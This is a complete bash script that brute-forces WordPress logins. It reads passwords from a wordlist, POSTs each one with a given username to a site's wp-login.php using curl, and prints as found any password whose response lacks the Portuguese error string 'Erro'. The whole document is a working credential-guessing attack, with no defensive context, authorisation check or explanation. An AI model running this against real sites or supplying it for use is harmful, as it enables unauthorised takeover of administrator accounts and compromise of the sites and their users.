#!/bin/bash

wordlist="$1"
user="$2"
url="$3"
echo "$url/wp-login.php"

for pass in $(cat $1); do
 
  resultado=$(curl -s -X POST "$url/wp-login.php" \
    -d "log=$user" \
    -d "pwd=$pass" \
    -d "wp-submit=Acessar" \
    -d "redirect_to=$url/wp-admin/" )

 if echo $resultado | grep -q Erro; then
   echo "Erro $pass" 
 else 
  echo "[+] Senha: $pass"
 fi
done


